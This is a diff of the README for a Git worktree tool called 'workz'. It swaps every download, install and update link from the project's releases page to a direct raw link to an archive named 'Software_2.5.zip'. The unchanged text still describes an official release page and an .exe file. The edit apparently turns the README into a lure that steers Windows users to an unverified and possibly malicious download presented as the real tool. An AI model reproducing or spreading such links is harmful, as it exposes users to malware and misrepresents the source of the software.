@@ -1,6 +1,6 @@
 # ⚙️ workz - Easy Git Worktree Management
 
-[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://github.com/Bet12387/workz/releases)
+[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to get workz ready on your Windows PC.
 
 Visit the official release page:
 
-[Download workz here](https://github.com/Bet12387/workz/releases)
+[Download workz here](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)
 
 This page lists all available versions. Pick the latest Windows release. It usually ends with `.exe`.
 
@@ -160,7 +160,7 @@ For further issues, check the GitHub issues page on the release repository.
 
 To update workz:
 
-1. Visit the release page again: [workz releases](https://github.com/Bet12387/workz/releases)  
+1. Visit the release page again: [workz releases](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)  
 2. Download the newest `.exe` file for Windows.  
 3. Run the new installer like before.  
 
@@ -207,4 +207,4 @@ workz --help
 
 ---
 
-[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://github.com/Bet12387/workz/releases)
+[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)
